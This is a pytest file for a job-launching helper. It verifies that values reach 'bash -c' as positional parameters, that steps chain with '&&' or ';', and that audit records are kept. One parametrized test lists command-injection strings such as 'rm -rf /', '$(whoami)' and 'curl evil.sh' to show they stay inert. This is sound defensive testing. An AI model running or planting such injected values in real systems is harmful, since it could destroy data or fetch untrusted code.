"""The job helpers — especially that values never reach the shell as text."""
import subprocess

import pytest

from core import jobs


def _script(cmd: list[str]) -> str:
    """The `bash -c` script portion of a built command."""
    assert cmd[0] == "bash" and cmd[1] == "-c"
    return cmd[2]


def test_systemctl_chain_passes_values_as_positional_parameters():
    cmd = jobs.systemctl_chain(["systemctl", "restart", "my-app"])
    script = _script(cmd)
    assert "my-app" not in script, "the unit name must not be spliced into the script text"
    assert "my-app" in cmd[4:]


def test_systemctl_chain_joins_steps_with_and():
    cmd = jobs.systemctl_chain(["systemctl", "daemon-reload"], ["systemctl", "start", "app"])
    assert " && " in _script(cmd)


def test_systemctl_chain_ignore_failures_uses_semicolons():
    cmd = jobs.systemctl_chain(
        ["systemctl", "stop", "app"], ["systemctl", "disable", "app"], ignore_failures=True
    )
    script = _script(cmd)
    assert " ; " in script
    assert "&&" not in script


@pytest.mark.parametrize(
    "hostile",
    ['app; rm -rf /', 'app$(whoami)', 'app`id`', 'app && curl evil.sh', "app' OR '1"],
)
def test_hostile_values_survive_as_single_arguments(hostile):
    """A value that slipped past validation still reaches echo as one word."""
    cmd = jobs.systemctl_chain(["echo", hostile], echo="finished")
    result = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8")
    assert result.returncode == 0
    assert result.stdout.splitlines() == [hostile, "finished"]


def test_launch_records_audit_and_returns_job_response(fake_runner, audit_log):
    response = jobs.launch(
        ["systemctl", "start", "app"],
        label="Start app",
        title="Starting 'app'",
        audit_action="service.start",
        audit_detail="name=app",
    )
    assert response.job_id == fake_runner.last["id"]
    assert response.title == "Starting 'app'"
    assert audit_log == [("service.start", f"name=app job={response.job_id}")]


def test_launch_title_defaults_to_label(fake_runner, audit_log):
    response = jobs.launch(["true"], label="Reload nginx", audit_action="nginx.reload")
    assert response.title == "Reload nginx"


def test_launch_bash_builds_a_sourcing_command(fake_runner, audit_log):
    jobs.launch_bash(
        "install_nginx", script="nginx.sh", label="Install NGINX", audit_action="tool.install"
    )
    cmd = fake_runner.last_cmd
    assert cmd[0] == "bash"
    assert cmd[-2:] == [str(cmd[-2]), "install_nginx"]
    assert cmd[-2].endswith("nginx.sh")


def test_launch_passes_env_without_exposing_it_in_the_command(fake_runner, audit_log):
    jobs.launch_bash(
        "install_postgres",
        script="postgres.sh",
        label="Install PostgreSQL",
        audit_action="tool.install",
        env={"DB_PASSWORD": "s3cret-value"},
    )
    assert fake_runner.last["env"] == {"DB_PASSWORD": "s3cret-value"}
    assert "s3cret-value" not in " ".join(fake_runner.last_cmd)
